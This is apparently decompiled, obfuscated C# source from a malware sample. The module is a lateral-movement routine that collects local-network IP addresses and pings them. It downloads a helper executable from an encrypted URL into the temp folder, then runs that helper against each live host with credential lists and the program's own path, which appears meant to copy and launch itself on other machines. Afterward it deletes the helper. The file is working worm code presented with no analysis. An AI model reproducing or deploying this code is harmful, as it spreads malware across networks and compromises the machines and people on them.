using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace WEoqBCtavg;

internal sealed class yWWIEMRoLilsp
{
	private sealed class MSxvoDyrsLF
	{
		public string heKRaVUlvzfDpMl;

		public string xBaaYjVBdwW;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107355134)) && !string_0.StartsWith(getString_0(107355129)) && !string_0.StartsWith(getString_0(107355088)) && !string_0.Contains(getString_0(107359546))) || !fyvpEkFKRXl(string_0))
			{
				return;
			}
			if (TwRTxDxfshC.hzJbsFiYNLv == getString_0(107397026))
			{
				for (int i = 0; i < nHBFBxVklBlFqB.Count; i++)
				{
					if (TwRTxDxfshC.xLagsDatIVFgBFzH)
					{
						if (File.Exists(heKRaVUlvzfDpMl))
						{
							TwRTxDxfshC.ZbTTlekIoxfjQQ(heKRaVUlvzfDpMl, getString_0(107358828) + string_0 + getString_0(107368226) + nHBFBxVklBlFqB[i] + getString_0(107368217) + lvCgisZorTPY[i] + getString_0(107368176) + Assembly.GetEntryAssembly()!.Location + getString_0(107358846));
						}
					}
					else if (File.Exists(xBaaYjVBdwW))
					{
						TwRTxDxfshC.ZbTTlekIoxfjQQ(xBaaYjVBdwW, getString_0(107358828) + string_0 + getString_0(107368226) + nHBFBxVklBlFqB[i] + getString_0(107368217) + lvCgisZorTPY[i] + getString_0(107368143) + Assembly.GetEntryAssembly()!.Location + getString_0(107358846));
					}
				}
			}
			else if (TwRTxDxfshC.xLagsDatIVFgBFzH)
			{
				if (File.Exists(heKRaVUlvzfDpMl))
				{
					TwRTxDxfshC.ZbTTlekIoxfjQQ(heKRaVUlvzfDpMl, getString_0(107358828) + string_0 + getString_0(107368118) + Assembly.GetEntryAssembly()!.Location + getString_0(107358846));
				}
			}
			else if (File.Exists(xBaaYjVBdwW))
			{
				TwRTxDxfshC.ZbTTlekIoxfjQQ(xBaaYjVBdwW, getString_0(107358828) + string_0 + getString_0(107368597) + Assembly.GetEntryAssembly()!.Location + getString_0(107358846));
			}
		}

		static MSxvoDyrsLF()
		{
			Strings.CreateGetStringDelegate(typeof(MSxvoDyrsLF));
		}
	}

	public static List<string> xlpsNfpEMPLWI;

	public static string LEoqCIXHps;

	public static List<string> nHBFBxVklBlFqB;

	public static List<string> lvCgisZorTPY;

	public static List<string> BjXsmxfMPLCOtJ;

	public List<string> SWMEhrRlhBcUW = new List<string>();

	public List<string> ozkyrHetNSyKuF = new List<string>();

	public List<string> CImdgoYZEoYBO = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void zpwbauDFVkIYWC()
	{
		MSxvoDyrsLF CS_0024_003C_003E8__locals0 = new MSxvoDyrsLF();
		TwRTxDxfshC.ErzSQOqXOzSO();
		List<MvLEYSxdEQ> list = MvLEYSxdEQ.AhucItNxYWWwh();
		foreach (MvLEYSxdEQ item in list)
		{
			xlpsNfpEMPLWI.Add(item.IPAddress);
		}
		if (TwRTxDxfshC.iKhbvkmTvhcXDjC.Count > 0)
		{
			xlpsNfpEMPLWI = xlpsNfpEMPLWI.Union(TwRTxDxfshC.iKhbvkmTvhcXDjC).ToList();
		}
		CS_0024_003C_003E8__locals0.heKRaVUlvzfDpMl = getString_0(107359543);
		CS_0024_003C_003E8__locals0.xBaaYjVBdwW = getString_0(107359543);
		try
		{
			CS_0024_003C_003E8__locals0.heKRaVUlvzfDpMl = eJOCyEHBCdxd();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.xBaaYjVBdwW = CHtdrBHyIvOE();
		}
		catch
		{
		}
		foreach (MvLEYSxdEQ item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107355131)) || item2.IPAddress.StartsWith(getString_0(107355126)) || item2.IPAddress.StartsWith(getString_0(107355085)) || item2.IPAddress.Contains(getString_0(107359543)))
				{
					WWKaHvatsNMQu.EvJDmgHnpIVt(item2.MacAddress, item2.IPAddress, getString_0(107368969));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(xlpsNfpEMPLWI, delegate(string string_0)
			{
				if ((string_0.StartsWith(MSxvoDyrsLF.getString_0(107355134)) || string_0.StartsWith(MSxvoDyrsLF.getString_0(107355129)) || string_0.StartsWith(MSxvoDyrsLF.getString_0(107355088)) || string_0.Contains(MSxvoDyrsLF.getString_0(107359546))) && fyvpEkFKRXl(string_0))
				{
					if (TwRTxDxfshC.hzJbsFiYNLv == MSxvoDyrsLF.getString_0(107397026))
					{
						for (int i = 0; i < nHBFBxVklBlFqB.Count; i++)
						{
							if (TwRTxDxfshC.xLagsDatIVFgBFzH)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.heKRaVUlvzfDpMl))
								{
									TwRTxDxfshC.ZbTTlekIoxfjQQ(CS_0024_003C_003E8__locals0.heKRaVUlvzfDpMl, MSxvoDyrsLF.getString_0(107358828) + string_0 + MSxvoDyrsLF.getString_0(107368226) + nHBFBxVklBlFqB[i] + MSxvoDyrsLF.getString_0(107368217) + lvCgisZorTPY[i] + MSxvoDyrsLF.getString_0(107368176) + Assembly.GetEntryAssembly()!.Location + MSxvoDyrsLF.getString_0(107358846));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.xBaaYjVBdwW))
							{
								TwRTxDxfshC.ZbTTlekIoxfjQQ(CS_0024_003C_003E8__locals0.xBaaYjVBdwW, MSxvoDyrsLF.getString_0(107358828) + string_0 + MSxvoDyrsLF.getString_0(107368226) + nHBFBxVklBlFqB[i] + MSxvoDyrsLF.getString_0(107368217) + lvCgisZorTPY[i] + MSxvoDyrsLF.getString_0(107368143) + Assembly.GetEntryAssembly()!.Location + MSxvoDyrsLF.getString_0(107358846));
							}
						}
					}
					else if (TwRTxDxfshC.xLagsDatIVFgBFzH)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.heKRaVUlvzfDpMl))
						{
							TwRTxDxfshC.ZbTTlekIoxfjQQ(CS_0024_003C_003E8__locals0.heKRaVUlvzfDpMl, MSxvoDyrsLF.getString_0(107358828) + string_0 + MSxvoDyrsLF.getString_0(107368118) + Assembly.GetEntryAssembly()!.Location + MSxvoDyrsLF.getString_0(107358846));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.xBaaYjVBdwW))
					{
						TwRTxDxfshC.ZbTTlekIoxfjQQ(CS_0024_003C_003E8__locals0.xBaaYjVBdwW, MSxvoDyrsLF.getString_0(107358828) + string_0 + MSxvoDyrsLF.getString_0(107368597) + Assembly.GetEntryAssembly()!.Location + MSxvoDyrsLF.getString_0(107358846));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.heKRaVUlvzfDpMl))
			{
				File.Delete(CS_0024_003C_003E8__locals0.heKRaVUlvzfDpMl);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.xBaaYjVBdwW))
			{
				File.Delete(CS_0024_003C_003E8__locals0.xBaaYjVBdwW);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string eJOCyEHBCdxd()
	{
		if (IntPtr.Size == 8)
		{
			return IhGsHnOnaoysL(new Uri(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368980))));
		}
		return IhGsHnOnaoysL(new Uri(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368980))));
	}

	public static string CHtdrBHyIvOE()
	{
		if (IntPtr.Size == 8)
		{
			return IhGsHnOnaoysL(new Uri(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368867))));
		}
		return IhGsHnOnaoysL(new Uri(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368310))));
	}

	public static bool fyvpEkFKRXl(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string IhGsHnOnaoysL(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107368205), getString_0(107359543)).Remove(0, 3) + getString_0(107368200);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static yWWIEMRoLilsp()
	{
		Strings.CreateGetStringDelegate(typeof(yWWIEMRoLilsp));
		xlpsNfpEMPLWI = new List<string>();
		LEoqCIXHps = getString_0(107359543);
		nHBFBxVklBlFqB = new List<string>();
		lvCgisZorTPY = new List<string>();
		BjXsmxfMPLCOtJ = new List<string>();
	}
}
